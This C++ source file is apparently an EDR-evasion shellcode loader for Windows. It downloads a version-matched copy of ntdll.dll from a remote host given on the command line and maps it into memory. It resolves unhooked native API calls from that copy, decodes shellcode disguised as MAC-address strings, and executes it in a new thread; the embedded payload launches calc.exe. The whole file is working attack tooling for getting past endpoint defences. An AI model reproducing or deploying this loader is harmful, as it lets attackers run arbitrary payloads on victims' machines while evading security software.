#include <Windows.h>
#include <stdio.h>
#include <Rpc.h>
#include <vector>
#include <psapi.h>
#include <winhttp.h>
#include <winternl.h>
#include <Ip2string.h>

#pragma comment(lib, "ntdll")
#pragma comment(lib, "winhttp")

#define NtCurrentProcess()	   ((HANDLE)-1)

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

#pragma comment(lib, "Rpcrt4.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


struct DLL {

    LPVOID ntdll;
    DWORD size;

};


typedef NTSTATUS (*_NtAllocateVirtualMemory)(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

typedef NTSTATUS (*_NtProtectVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);



typedef NTSTATUS (*_NtCreateThreadEx)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

typedef NTSTATUS (*_NtWaitForSingleObject)(
    IN HANDLE         Handle,
    IN BOOLEAN        Alertable,
    IN PLARGE_INTEGER Timeout
);



DLL GetNtdll(wchar_t* whost, DWORD port, wchar_t* wresource) {
    struct DLL dll;
    std::vector<unsigned char> PEbuf;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);


    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, whost,
            port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {


                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);

                    // Unhook NTDLL;
                    //Unhook((LPVOID)pszOutBuffer);

                }
                delete[] pszOutBuffer;

            }

        } while (dwSize > 0);

        if (PEbuf.empty() == TRUE)
        {
            printf("Failed in retrieving the PE");
        }

        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = PEbuf.size();

        char* ntdll = (char*)malloc(size);
        for (int i = 0; i < PEbuf.size(); i++) {
            ntdll[i] = PEbuf[i];
        }
        dll.ntdll = ntdll;
        dll.size = size;
        return dll;
}



BOOL isItHooked(LPVOID addr) {
    BYTE stub[] = "\x4c\x8b\xd1\xb8";
    if (memcmp(addr, stub, 4) != 0)
        return TRUE;
    return FALSE;
}

PVOID BaseAddress = NULL;
SIZE_T dwSize = 0x2000;


HANDLE hThread;
DWORD OldProtect = 0;



HANDLE hHostThread = INVALID_HANDLE_VALUE;



int main(int argc, char** argv) {
    
    // Validate the parameters
    if (argc != 3) {
        printf("[+] Usage: %s <RemoteIP> <RemotePort>\n", argv[0]);
        return 1;
    }


    char* host = argv[1];
    DWORD port = atoi(argv[2]);


    const size_t cSize1 = strlen(host) + 1;
    wchar_t* whost = new wchar_t[cSize1];
    mbstowcs(whost, host, cSize1);



    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    wprintf(L"\n\n[+] Windows Version %s Found\n", value);
    int winVersion = _wtoi(value);

    DLL ntdll;

    switch (winVersion) {
    case 1903:
        ntdll = GetNtdll(whost, port, (wchar_t*)L"ntdll1903.dll");
        break;
    case 2004:
        ntdll = GetNtdll(whost, port, (wchar_t*)L"ntdll2004.dll");
        break;
    case 2009:
        ntdll = GetNtdll(whost, port, (wchar_t*)L"ntdll2009.dll");
        break;
    default:
       wprintf(L"[!] Version Offsets Not Found!\n");

    }

    
    printf("\n[+] Got ntdll from %s:%d\n\n", host, port);

    char* dllBytes = (char*)malloc(ntdll.size);
    memcpy(dllBytes, ntdll.ntdll, ntdll.size);


    IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)dllBytes;
    IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)dllBytes + DOS_HEADER->e_lfanew);

    SIZE_T sizeDll = NT_HEADER->OptionalHeader.SizeOfImage;

    LPVOID alloc_mem = VirtualAlloc(0, sizeDll, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    CopyMemory(alloc_mem, dllBytes, NT_HEADER->OptionalHeader.SizeOfHeaders);

    //load sections into memory
    IMAGE_SECTION_HEADER* SECTION_HEADER = IMAGE_FIRST_SECTION(NT_HEADER);
    for (int i = 0; i < NT_HEADER->FileHeader.NumberOfSections; i++) {

        LPVOID sectionDest = (LPVOID)((DWORD64)alloc_mem + (DWORD64)SECTION_HEADER->VirtualAddress);
        LPVOID sectionSource = (LPVOID)((DWORD64)dllBytes + (DWORD64)SECTION_HEADER->PointerToRawData);
        CopyMemory(sectionDest, sectionSource, SECTION_HEADER->SizeOfRawData);

        SECTION_HEADER++;
    }

    // Copy IAT to memory

    IMAGE_IMPORT_DESCRIPTOR* IMPORT_DATA = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[1].VirtualAddress);

    LPCSTR ModuleName = "";
    while (IMPORT_DATA->Name != NULL) {

        ModuleName = (LPCSTR)IMPORT_DATA->Name + (DWORD64)alloc_mem;
        IMAGE_THUNK_DATA* firstThunk;
        HMODULE hmodule = LoadLibraryA(ModuleName);
        if (hmodule) {
            firstThunk = (IMAGE_THUNK_DATA*)((DWORD64)alloc_mem + IMPORT_DATA->FirstThunk);
            for (int i = 0; firstThunk->u1.AddressOfData; firstThunk++) {

                DWORD64 importFn = (DWORD64)alloc_mem + *(DWORD*)firstThunk;
                LPCSTR n = (LPCSTR)((IMAGE_IMPORT_BY_NAME*)importFn)->Name;	// get the name of each imported function 
                *(DWORD64*)firstThunk = (DWORD64)GetProcAddress(hmodule, n);
            }
        }
        IMPORT_DATA++;
    }

    // Copy EAT to memory

    IMAGE_EXPORT_DIRECTORY* EXPORT_DIR = (IMAGE_EXPORT_DIRECTORY*)((DWORD64)alloc_mem + NT_HEADER->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* addrNames = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNames);
    DWORD* addrFunction = (DWORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfFunctions);
    WORD* addrOrdinal = (WORD*)((DWORD64)alloc_mem + EXPORT_DIR->AddressOfNameOrdinals);

    DWORD* addrNames1 = addrNames;
    _NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
    char NtAllocateVirtualMemorytxt[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
	for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
		char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames1++);

        //printf("%p\n", ((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]));
		
        if (strstr(name, NtAllocateVirtualMemorytxt) != NULL) {
			pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
			break;
		}
        
	}

    
    printf("\n\nntdll mem_addr  =  %p\n\n", alloc_mem);


	if (pNtAllocateVirtualMemory) {
        NTSTATUS status1 = pNtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(status1)) {
            printf("[!] Failed in NtAllocateVirtualMemory (%u)\n", GetLastError());
            return 1;
        }
        printf("\n[+] NtAllocateVirtualMemory @ %p\n", pNtAllocateVirtualMemory);
        printf("[+] NtAllocatedVirtualMemory Executed !!!\n");
	}
 
    
    const char* MAC[] =
    {
        "FC-48-83-E4-F0-E8",
        "C0-00-00-00-41-51",
        "41-50-52-51-56-48",
        "31-D2-65-48-8B-52",
        "60-48-8B-52-18-48",
        "8B-52-20-48-8B-72",
        "50-48-0F-B7-4A-4A",
        "4D-31-C9-48-31-C0",
        "AC-3C-61-7C-02-2C",
        "20-41-C1-C9-0D-41",
        "01-C1-E2-ED-52-41",
        "51-48-8B-52-20-8B",
        "42-3C-48-01-D0-8B",
        "80-88-00-00-00-48",
        "85-C0-74-67-48-01",
        "D0-50-8B-48-18-44",
        "8B-40-20-49-01-D0",
        "E3-56-48-FF-C9-41",
        "8B-34-88-48-01-D6",
        "4D-31-C9-48-31-C0",
        "AC-41-C1-C9-0D-41",
        "01-C1-38-E0-75-F1",
        "4C-03-4C-24-08-45",
        "39-D1-75-D8-58-44",
        "8B-40-24-49-01-D0",
        "66-41-8B-0C-48-44",
        "8B-40-1C-49-01-D0",
        "41-8B-04-88-48-01",
        "D0-41-58-41-58-5E",
        "59-5A-41-58-41-59",
        "41-5A-48-83-EC-20",
        "41-52-FF-E0-58-41",
        "59-5A-48-8B-12-E9",
        "57-FF-FF-FF-5D-48",
        "BA-01-00-00-00-00",
        "00-00-00-48-8D-8D",
        "01-01-00-00-41-BA",
        "31-8B-6F-87-FF-D5",
        "BB-E0-1D-2A-0A-41",
        "BA-A6-95-BD-9D-FF",
        "D5-48-83-C4-28-3C",
        "06-7C-0A-80-FB-E0",
        "75-05-BB-47-13-72",
        "6F-6A-00-59-41-89",
        "DA-FF-D5-63-61-6C",
        "63-2E-65-78-65-00",
    };
    


    int rowLen = sizeof(MAC) / sizeof(MAC[0]);
    PCSTR Terminator = NULL;
    NTSTATUS STATUS;

    DWORD_PTR ptr = (DWORD_PTR)BaseAddress;
    for (int i = 0; i < rowLen; i++) {
        STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[i], &Terminator, (DL_EUI48*)ptr);
        if (!NT_SUCCESS(STATUS)) {
            return FALSE;
        }
        ptr += 6;

    }

   

    DWORD* addrNames2 = addrNames;
    _NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
    char NtProtectVirtualMemorytxt[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
        char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames2++);

        if (strstr(name, NtProtectVirtualMemorytxt) != NULL) {
            pNtProtectVirtualMemory = (_NtProtectVirtualMemory)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
            break;
        }

    }

   
    if (pNtProtectVirtualMemory) {
        NTSTATUS status2 = pNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
        if (!NT_SUCCESS(status2)) {
            printf("[!] Failed in NtProtectVirtualMemory (%u)\n", GetLastError());
            return 1;
        }
        printf("\n[+] NtProtectVirtualMemory @ %p\n", pNtProtectVirtualMemory);
        printf("[+] NtProtectVirtualMemory Executed !!!\n");
    }

   
    DWORD* addrNames3 = addrNames;
    _NtCreateThreadEx pNtCreateThreadEx = NULL;
    char NtCreateThreadExtxt[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
    for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
        char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames3++);

        if (strstr(name, NtCreateThreadExtxt) != NULL) {
            pNtCreateThreadEx = (_NtCreateThreadEx)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
            break;
        }

    }

    if (pNtCreateThreadEx) {
        NTSTATUS status3 = pNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
        if (!NT_SUCCESS(status3)) {
            printf("[!] Failed in NtCreateThreadEx (%u)\n", GetLastError());
            return 1;
        }
        printf("\n[+] NtCreateThreadEx @ %p\n", pNtCreateThreadEx);
        printf("[+] NtCreateThreadEx Executed !!!\n");
    }
    
    
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;
   
    NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in NtWaitForSingleobject (%u)\n", GetLastError());
        return 4;
    }
    printf("\n[+] NtWaitForSingleobject Executed !!!\n");

    printf("\n\n[+] Finished !!!!\n");

    
    return 0;

}